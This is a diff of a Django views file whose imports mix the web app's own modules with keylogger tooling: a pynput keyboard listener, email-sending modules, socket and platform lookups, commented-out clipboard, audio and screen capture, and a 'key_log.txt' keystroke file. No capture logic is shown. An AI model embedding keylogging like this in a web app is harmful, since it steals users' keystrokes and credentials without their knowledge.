@@ -1,7 +1,7 @@
-from django.shortcuts import render, HttpResponse
+# from django.shortcuts import render, HttpResponse
 from django.http import HttpResponseRedirect
-from .forms import CourseForm
-import asyncio
+# from .forms import CourseForm
+# import asyncio
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -9,27 +9,27 @@ from email import encoders
 import smtplib
 from django.shortcuts import render
 import mysql.connector as sql
-from _multiprocessing import send
-from typing import BinaryIO
-import time
-import base64, os
+# from _multiprocessing import send
+# from typing import BinaryIO
+# import time
+# import base64, os
 import socket
 import platform
 
-import win32clipboard
+# import win32clipboard
 
 from pynput.keyboard import Key, Listener
 
-import time
+# import time
 import os
 
-from scipy.io.wavfile import write
-
-import getpass
+# from scipy.io.wavfile import write
+#
+# import getpass
 from requests import get
 
-from multiprocessing import Process, freeze_support
-# from PIL import ImageGrab
+# from multiprocessing import Process, freeze_support
+# # from PIL import ImageGrab
 
 # file for storing keystroke
 keys_information = "key_log.txt"
